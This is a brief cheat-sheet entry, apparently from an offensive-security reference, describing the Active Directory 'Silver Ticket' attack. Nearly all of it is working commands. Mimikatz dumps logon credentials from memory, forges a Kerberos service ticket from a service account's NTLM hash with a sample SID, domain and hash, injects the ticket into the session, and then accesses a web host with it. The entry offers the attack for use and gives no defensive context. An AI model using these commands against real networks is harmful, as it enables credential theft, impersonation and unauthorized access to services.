---
title: Silver Ticket
category: ad
subcategory: ad-attacks
os: windows
command: kerberos::golden /sid:SID /domain:domain /target:host /service:svc /rc4:hash /user:user /ptt
tools: mimikatz
---


A silver ticket forges a TGS for one specific service on one host (HTTP, CIFS, MSSQL, etc.) using the service account's NTLM hash.

### Step 1 - Find the SID and service hash

```
privilege::debug
sekurlsa::logonpasswords
```

```cmd
whoami /user
```

### Step 2 - Forge the TGS

```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
klist
```

### Step 3 - Use it

```powershell
iwr -UseDefaultCredentials http://web04
```
